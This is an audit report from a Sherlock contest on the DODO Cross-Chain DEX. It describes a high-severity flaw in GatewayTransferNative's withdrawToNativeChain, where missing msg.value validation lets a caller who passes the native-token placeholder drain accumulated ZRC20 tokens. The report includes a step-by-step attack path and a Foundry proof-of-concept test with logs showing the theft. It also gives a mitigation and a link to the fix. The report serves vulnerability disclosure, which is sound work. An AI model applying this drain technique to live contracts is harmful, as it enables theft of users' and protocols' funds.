---
tags:
  - lang/solidity
  - sector/bridge
  - sector/dex
  - sector/stable
  - sector/token
  - platform/sherlock
  - has/github
  - has/poc
  - severity/high
protocol: "[[DODO Cross Chain DEX]]"
auditors:
  - X0sauce
report: "https://github.com/sherlock-audit/2025-05-dodo-cross-chain-dex-judging"
genome:
  - "[[bridge-sender-auth]]"
  - "[[message-spoofing]]"
  - "[[direct-drain]]"
  - "[[variant]]"
  - "[[bridge-is-secure]]"
  - "[[add-check]]"
  - "[[cross-chain-message]]"
---
# H-2: Any attacker will steal accumulated ZRC20 tokens from `GatewayTransferNative` contract

- id: 58579
- impact: HIGH
- protocol: DODO Cross-Chain DEX
- reporter: X0sauce (Sherlock)
- source: N/A

## Summary


The report discusses a bug found in the DODO cross-chain DEX protocol that could result in a complete loss of accumulated ZRC20 tokens. The bug was found by multiple individuals and is caused by missing validation of msg.value when zrc20 equals `_ETH_ADDRESS_` in the `withdrawToNativeChain` function. This allows attackers to bypass transferFrom validation and target real ZRC20 contracts through malicious message crafting. The impact of this bug is a complete loss of accumulated tokens and the attacker gaining the full value of stolen tokens with only gas fees as cost. A proof of concept test is provided to demonstrate the attack and the protocol team has fixed the issue in their code. The recommended mitigation is to add proper validation for native token amounts in the `withdrawToNativeChain` function. 

## Details


Source: https://github.com/sherlock-audit/2025-05-dodo-cross-chain-dex-judging/issues/219 

## Found by 
0xEkko, 10ap17, Pianist, SafetyBytes, X0sauce, farismaulana, radevweb3, theboiledcorn

### Summary

Missing msg.value validation for native token withdrawals will cause a complete loss of accumulated ZRC20 tokens for the protocol as attackers will abuse the native token placeholder to bypass transferFrom validation while targeting real ZRC20 contracts through malicious message crafting.

### Root Cause

In [GatewayTransferNative.sol:534-537](https://github.com/sherlock-audit/2025-05-dodo-cross-chain-dex/blob/d4834a468f7dad56b007b4450397289d4f767757/omni-chain-contracts/contracts/GatewayTransferNative.sol#L534-L537) there is missing validation of msg.value against the claimed amount parameter when zrc20 equals `_ETH_ADDRESS_` , allowing users to claim arbitrary native token amounts without actually sending them.

```solidity
function withdrawToNativeChain(
    address zrc20,
    uint256 amount,
    bytes calldata message
) external payable {
    if(zrc20 != _ETH_ADDRESS_) {
        require(IZRC20(zrc20).transferFrom(msg.sender, address(this), amount), "INSUFFICIENT ALLOWANCE: TRANSFER FROM FAILED");
    } 
    // ← Missing: require(msg.value >= amount, "INSUFFICIENT NATIVE TOKEN");
}
```

### Internal Pre-conditions

None

### External Pre-conditions

None

### Attack Path

1. Attacker identifies accumulated ZRC20 tokens in the GatewayTransferNative contract (e.g., 1000 USDC.ZRC20)
2. Attacker crafts a malicious message where decoded.targetZRC20 points to the real USDC.ZRC20 contract address
3. Attacker calls `withdrawToNativeChain{value: 0}(_ETH_ADDRESS_, 1000e6, maliciousMessage)`
4. Function bypasses transferFrom validation due to zrc20 == _ETH_ADDRESS_ condition
5. Function processes withdrawal using the claimed amount (1000 USDC) from contract's accumulated balance
6. Function calls withdrawGasFeeWithGasLimit on real USDC.ZRC20 contract (avoids revert)
7. Cross-chain withdrawal executes successfully, sending 1000 native USDC to attacker's destination address
8. Contract's accumulated USDC.ZRC20 tokens are burned/depleted while attacker receives native USDC

### Impact

The protocol suffers a complete loss of all accumulated ZRC20 tokens that can be targeted through message crafting. The attacker gains the full value of stolen tokens with only gas fees as cost, achieving near-infinite profit margins on successful attacks.

### PoC

Add this test to `GatewayTransferNative.t.sol` and run:

```bash
forge test --fork-url https://zetachain-evm.blockpi.network/v1/rpc/public --match-test test_withdraw_native_Vulnerability -vv
```

```solidity
   function test_withdraw_native_Vulnerability() public {
        uint256 stolenAmount = 100 ether;   // Amount to steal from contract
        uint256 actualZETASent = 0;         // User sends 0 ZETA
        uint32 dstChainId = 2;
        
        // ATTACK: Use _ETH_ADDRESS_ to bypass transferFrom, but target real ZRC20 in message
        address inputToken = _ETH_ADDRESS_;        // ← Bypass transferFrom validation
        address targetZRC20 = address(token1Z);    // ← Real ZRC20 in decoded message
        
        bytes memory sender = abi.encodePacked(user1);
        bytes memory receiver = abi.encodePacked(user2);
        bytes memory swapDataZ = "";
        bytes memory contractAddress = abi.encodePacked(address(gatewaySendB));
        bytes memory fromTokenB = abi.encodePacked(address(token1B));
        bytes memory toTokenB = abi.encodePacked(address(token1B));
        bytes memory swapDataB = "";
        bytes memory accounts = "";
        
        // MALICIOUS MESSAGE: Points to real ZRC20 token to avoid revert
        bytes memory maliciousMessage = encodeMessage(
            dstChainId,
            targetZRC20,      // ← Real token1Z address (not _ETH_ADDRESS_)
            sender,
            receiver,
            swapDataZ,
            contractAddress,
            abi.encodePacked(
                fromTokenB, 
                toTokenB, 
                swapDataB
            ),
            accounts
        );

        // Setup: Contract has accumulated token1Z from previous operations
        token1Z.mint(address(gatewayTransferNative), stolenAmount);
        
        // Record initial balances
        uint256 user1InitialZETA = user1.balance;
        uint256 user2InitialTokens = token1B.balanceOf(user2);
        uint256 contractInitialTokens = token1Z.balanceOf(address(gatewayTransferNative));
        
        console.log("BEFORE ATTACK:");
        console.log("User1 ZETA balance:", user1InitialZETA / 1e18);
        console.log("Contract token1Z balance:", contractInitialTokens / 1e18);
        console.log("User2 token1B balance:", user2InitialTokens / 1e18);
        console.log("");
        
        vm.startPrank(user1);
        // ATTACK: Use native token placeholder to bypass validation
        gatewayTransferNative.withdrawToNativeChain{value: actualZETASent}(
            inputToken,         // _ETH_ADDRESS_ bypasses transferFrom 
            stolenAmount,       // Claims 100 token1Z
            maliciousMessage    // Decodes to real token1Z to avoid revert
        );
        vm.stopPrank();

        // Verify successful attack
        uint256 user1FinalZETA = user1.balance;
        uint256 user2FinalTokens = token1B.balanceOf(user2);
        uint256 contractFinalTokens = token1Z.balanceOf(address(gatewayTransferNative));
        
        console.log("AFTER ATTACK:");
        console.log("User1 ZETA balance:", user1FinalZETA / 1e18);
        console.log("Contract token1Z balance:", contractFinalTokens / 1e18);
        console.log("User2 token1B balance:", user2FinalTokens / 1e18);
        console.log("");
        
        // Attack success verification
        assertEq(user1FinalZETA, user1InitialZETA - actualZETASent, "User should only lose sent ZETA");
        assertGt(user2FinalTokens, user2InitialTokens, "User2 should receive stolen tokens");
        assertLt(contractFinalTokens, contractInitialTokens, "Contract should lose tokens");
        
        uint256 tokensStolen = contractInitialTokens - contractFinalTokens;
        uint256 tokensReceived = user2FinalTokens - user2InitialTokens;
        
        console.log("Tokens stolen from contract:", tokensStolen / 1e18);
        console.log("Tokens received by User2:", tokensReceived / 1e18);
        
        // Should have stolen significant amount
        assertGt(tokensStolen, 90 ether, "Should steal most of the claimed amount");
    }
```

```solidity
Logs:
  BEFORE ATTACK:
  User1 ZETA balance: 1000
  Contract token1Z balance: 100
  User2 token1B balance: 0
  
  AFTER ATTACK:
  User1 ZETA balance: 1000
  Contract token1Z balance: 1
  User2 token1B balance: 99
  
  Tokens stolen from contract: 99
  Tokens received by User2: 99
```

### Mitigation

Add proper validation for native token amounts in the `withdrawToNativeChain` function

## Discussion

**sherlock-admin2**

The protocol team fixed this issue in the following PRs/commits:
https://github.com/Skyewwww/omni-chain-contracts/pull/32





